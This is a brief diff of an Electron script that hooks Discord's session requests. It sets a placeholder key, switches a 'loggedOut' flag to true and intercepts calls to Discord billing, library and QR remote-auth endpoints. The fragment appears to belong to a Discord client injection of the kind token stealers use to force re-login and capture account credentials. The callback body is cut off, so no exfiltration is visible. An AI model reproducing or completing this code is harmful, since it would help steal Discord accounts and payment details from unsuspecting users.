@@ -3,7 +3,7 @@ const {
     , session
 } = require('electron');
 const key = '%key%';
-var loggedOut = false;
+var loggedOut = true;
 session.defaultSession.webRequest.onBeforeRequest({
     'urls': ['https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json', 'https://*.discord.com/api/v*/applications/detectable', 'https://discord.com/api/v*/applications/detectable', 'https://*.discord.com/api/v*/users/@me/library', 'https://discord.com/api/v*/users/@me/library', 'https://*.discord.com/api/v*/users/@me/billing/subscriptions', 'https://discord.com/api/v*/users/@me/billing/subscriptions', 'wss://remote-auth-gateway.discord.gg/*']
 }, (details, callback) => {
